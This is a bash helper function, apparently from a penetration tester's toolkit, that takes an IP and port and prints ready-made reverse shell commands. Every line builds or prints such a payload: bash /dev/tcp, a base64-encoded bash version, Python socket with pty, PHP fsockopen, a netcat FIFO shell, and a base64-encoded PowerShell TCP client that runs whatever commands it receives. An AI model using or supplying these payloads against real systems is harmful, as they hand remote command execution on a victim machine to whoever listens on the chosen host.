revshell(){ 
  ip=$1; port=$2;

  bash_shell="/usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
  shell_encode=$(echo "$bash_shell"|base64 -w 0)
  
  
  ps_cmd="\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

  ps_base64=$(echo "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)

  echo -e "\n[+] Bash: /usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo -e "[+] Bash Encoded: $shell_encode"
  echo "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
  echo "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
  echo "[+] Netcat FIFO: rm /tmp/wk;mkfifo /tmp/wk;cat /tmp/wk|/bin/bash -i 2>&1|nc $ip $port"
  echo "[+] PowerShell (Base64): powershell -e $ps_base64"
}
